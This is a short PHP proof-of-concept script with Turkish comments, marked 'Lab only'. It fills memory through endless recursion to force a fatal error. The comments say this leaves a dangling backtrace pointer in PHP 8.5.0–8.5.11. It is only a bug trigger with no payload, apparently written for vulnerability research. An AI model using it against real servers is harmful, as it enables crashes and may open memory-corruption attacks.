<?php
// Bug 3 PRODUCER: bellek limitini doldurup fatal error uretir.
// Fatal handler, backtrace'i EG(last_fatal_error_backtrace)'e yazar;
// 8.5.0-8.5.11'de fast-shutdown bu referansi temizlemez (dangling ptr).
// Lab only.
function grow($depth) {
    static $chunks = array();
    $chunks[] = str_repeat('A', 1024 * 1024);
    return grow($depth + 1); // derin cagri zinciri -> anlamli backtrace
}
grow(0);
echo "unreachable\n";
